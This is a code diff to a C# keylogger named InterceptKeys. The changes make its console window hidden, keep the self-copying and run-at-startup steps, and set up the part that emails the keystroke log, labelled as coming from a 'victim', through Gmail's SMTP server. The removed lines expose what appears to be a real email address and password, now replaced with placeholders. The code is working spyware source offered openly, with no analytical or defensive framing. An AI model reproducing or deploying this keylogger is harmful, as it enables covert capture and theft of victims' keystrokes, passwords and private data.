@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
@@ -22,7 +22,7 @@ class InterceptKeys
         var handle = GetConsoleWindow();
 
         // Hide
-        // ShowWindow(handle, SW_HIDE);
+         ShowWindow(handle, SW_HIDE);
         //copy app
         Doplicate();
         //run on startup
@@ -77,8 +77,8 @@ class InterceptKeys
             {
                 MailMessage mail = new MailMessage();
                 SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
-                mail.From = new MailAddress(" yosish2222@gmail.com");
-                mail.To.Add(" yosish2222@gmail.com");
+                mail.From = new MailAddress("your@email.com");
+                mail.To.Add("your@email.com");
                 mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 mail.Body = "New kelogging file from victim, finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
 
@@ -86,7 +86,7 @@ class InterceptKeys
                 attachment = new System.Net.Mail.Attachment(pathToLog);
                 mail.Attachments.Add(attachment);
                 SmtpServer.Port = 587;
-                SmtpServer.Credentials = new System.Net.NetworkCredential(" yosish2222@gmail.com", "huxhhuxh11");
+                SmtpServer.Credentials = new System.Net.NetworkCredential("your@email.com", "EMAIL PASSWORD");
                 SmtpServer.EnableSsl = true;
                 SmtpServer.Send(mail);
                 //clear mail attachment
